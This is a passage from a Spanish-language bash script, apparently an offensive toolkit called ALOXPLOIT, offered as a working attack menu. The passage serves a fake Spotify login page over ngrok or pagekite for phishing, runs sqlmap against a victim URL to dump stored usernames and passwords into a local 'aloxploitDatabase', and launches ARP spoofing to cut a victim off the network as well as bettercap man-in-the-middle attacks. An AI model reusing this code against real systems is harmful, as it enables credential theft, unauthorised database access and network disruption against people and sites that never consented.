                                echo -e "$verde NGROK DEBE ESTAR INSTALADO - Para poder utilizar esta funcion debes estar registrado en la pagina de ngrok y tenerlo descargado en esta ubicación $fincolor"

                                elif [ $tunel = "Pagekite" ]
                                then
                                userpagekite=`zenity --title "ALOXPLOIT" --text "Nombre de usuario de pagekite" --entry  --width 300 2> /dev/null`
                                echo -e "$verde URL Spotify: "https://${userpagekite}.pagekite.me/spotify.php""
                                xterm -fa 'Monospace:size=18' -e python3 pagekite.py 80 "${userpagekite}.pagekite.me"
                                fi

                        fi

#

		fi
		echo ""
		echo -e  " --> $azul2 Todos los datos recogidos en el phishing se almacenaran en la base de datos aloxploitDatabase $fincolor"
	else
	
	systemctl stop apache2
	#setoolkit
	# el -e nos permite ejecutar comandos al abrir xterm
	xterm -fa 'Monospace:size=18' -e "setoolkit"
	fi

		# --- REALIZAR SQL INYECTION ---

elif [ $menu -eq 6 ]
then
	
	echo "Primero se deben sacar los directorios de la web vulnerables con el escaneo de puertos de nmap"
	echo ""
	#nmap -p 80 --script=http-enum $ip
 
	ipsql=`zenity --title " ALOXPLOIT" --text "Ip de la victima" --entry  --width 300 2> /dev/null`
	#nmap -sn $ipsql > ip.txt 
	url=`zenity --title " ALOXPLOIT" --text "Introducce la URL vulnerable" --entry  --width 300 2> /dev/null`

	nmap -sn $ipsql > ip.txt 
	ip=`grep "Nmap scan" ip.txt | cut -d" " -f5`
	mac=`grep "MAC" ip.txt | cut -d" " -f3`
	so=`grep "MAC" ip.txt | cut -d" " -f4`
	echo "nmap hecho"

	#echo "sqlmap -u '${url}' -dbs --non-interactive > dump1.txt" 
	sqlmap -u ${url} -dbs --non-interactive > dump2.txt
	#sqlmap -u "http://${ip}/index.html?id=1" -dbs > dump1.txt
	bd=`grep -B1 "information_schema" dump2.txt |tail -2 | head -1 | cut -f2 -d" "`
	echo "$bd"
	echo ""
# voy a probar a coger los datos alamcenados en el archivo para meterlos a la base de datos
# la ruta es esta, (cambiar ip bd y lo de user no se como aparece en otras inyecciones, lo dejo en principio pero probar en otras)
#/root/.local/share/sqlmap/output/192.168.18.51/dump/ehks/user.csv
	echo " Espere mientras se realiza la inyeccion - puede llevar varios minutos"
	sqlmap  -u ${url} -D $bd --tables --dump --non-interactive 
	
	echo "terminado datos almacenados en dump3.txt"
	user=`grep "^[123456789]" /root/.local/share/sqlmap/output/${ipsql}/dump/${bd}/user.csv | cut -d"," -f2` 
	pass=`grep "^[123456789]" /root/.local/share/sqlmap/output/${ipsql}/dump/${bd}/user.csv | cut -d"," -f3`
	
	mysql -e \ "INSERT INTO inyeccion (user,password,ip,mac,SO) VALUES ('$user','$pass','$ip','$mac','$so') " aloxploitDatabase
	echo "datos almacenados"
 	rm ip.txt

		# --- EXPLORAR BASE DE DATOS ALOXPLOITDATABASE ---

elif [ $menu -eq 7 ]
then
	bd=`zenity --title "ALOXPLOIT" --list --text "Consulta la base de datos:" --radiolist --column "seleccion"  --column "Opciones" TRUE "Tablas" FALSE "TablaRedes" FALSE "TablaDatos" FALSE "TablaInyeccion" FALSE "SentenciaSQL" --width 400 --height 400 2> /dev/null`
	echo " "

	if [ $bd = "Tablas" ]
	then
		echo -e  "$azul2 Se mostraran todas las tablas de la base de datos aloxploitDatabase $fincolor"
		echo ""
		mysql -e \ "USE aloxploitDatabase; show tables" 


	elif [ $bd = "TablaRedes" ]
	then
		echo -e  "$azul2 Se mostraran todos los datos extraidos del escaneo de puertos $fincolor"
		echo ""
		mysql -e \ "USE aloxploitDatabase; select * from redes \G" 

	elif [ $bd = "TablaDatos" ]
	then
                echo -e  "$azul2 Se mostraran todos los datos obtenidos a través de phishing $fincolor"
		echo ""
		mysql -e \ "USE aloxploitDatabase; select * from datos \G" 

	elif [ $bd = "TablaInyeccion" ]
	then
		echo -e "$azul2 Se mostraran los datos extraidos de los sql inyection $fincolor"
		echo ""
		mysql -e \ "USE aloxploitDatabase; select * from inyeccion \G"

	elif [ $bd = "SentenciaSQL" ]
	then
		sql=`zenity --title " ALOXPLOIT" --text "Introducce sentencia SQL" --entry  --width 300 2> /dev/null`
		mysql -e \ "USE aloxploitDatabase; $sql ;"
	fi

		# --- ATAQUES DE RED LOCAL ---

elif [ $menu -eq 8 ]
then
	echo "Ataques de Red"
	
	redlocal=`zenity --title "ATAQUES RED LOCAL" --list --text "ATAQUES RED LOCAL" --radiolist --column "seleccion"  --column "Opciones" TRUE "Bloquear conexión a un dispositivo" FALSE "MITM con Bettercap" --width 400 --height 400 2> /dev/null`
	echo "$redlocal"
	if [ "$redlocal" == "Bloquear conexión a un dispositivo" ]
	then
	ip3=`zenity --title "ALOXPLOIT" --text "Introducce IP del equipo victima" --entry  --width 300 2> /dev/null`
	echo "Usa CTRL C para finalizar"
	xterm -fa 'Monospace:size=18' -e "arpspoof -i '$interfaz' -t '$ip3' '$iprouter1'"
	elif [ "$redlocal" == "MITM con Bettercap" ]
	then
	xterm -fa 'Monospace:size=18' -e "bettercap"
	
	fi

                # --- CIERRE ALOXPLOIT ---

elif [ $menu -eq 0 ]
then
	echo "Hasta la próxima"
else 
	echo "opción incorrecta"
fi
sleep 2
	echo " "
	echo -e "$rojo ----press intro to continue----" $fincolor
read intro
done




